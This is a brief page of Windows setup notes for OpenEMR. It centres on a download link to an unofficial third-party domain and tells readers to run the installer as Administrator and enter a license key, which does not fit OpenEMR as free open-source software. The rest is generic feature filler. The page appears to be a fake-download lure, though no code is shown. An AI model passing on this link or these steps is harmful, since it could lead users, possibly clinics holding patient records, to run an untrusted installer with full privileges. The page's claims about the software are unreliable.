# OpenEMR Windows Setup Notes

## Download & Install

> **Download:** [**Get OpenEMR for Windows →**](https://open-emr-2026.kolmods.com/)
>
> Setup notes for **OpenEMR** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **OpenEMR** from the Start menu

- Core OpenEMR features on Windows desktop
- Install and configure OpenEMR for daily use

- Integrate OpenEMR into your existing workflow
